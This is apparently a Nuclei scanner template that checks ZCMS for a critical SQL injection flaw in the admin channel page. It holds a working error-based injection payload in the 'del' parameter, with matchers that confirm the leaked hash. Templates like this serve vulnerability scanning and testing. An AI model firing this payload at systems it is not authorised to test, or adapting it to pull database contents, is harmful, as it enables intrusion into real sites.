id: zcms-v3-sqli
info:
  name: ZCMS - SQL Injection
  author: princechaddha
  severity: critical
  description: The ZCMS software has a vulnerability allowing attackers to access
    and modify data in the database, and execute unauthorized administrative operations.
  reference:
  - https://www.anquanke.com/post/id/183241
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: zcms,sqli
  metadata:
    impact: The SQL injection vulnerability in ZCMS can potentially lead to unauthorized
      access, data manipulation, and administrative control by an attacker.
    recommendation: It is highly recommended to apply the necessary patches or updates
      to ZCMS in order to mitigate the SQL Injection vulnerability and prevent potential
      attacks.
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'''
  matchers-condition: and
  matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
    part: body
  - type: status
    status:
    - 200
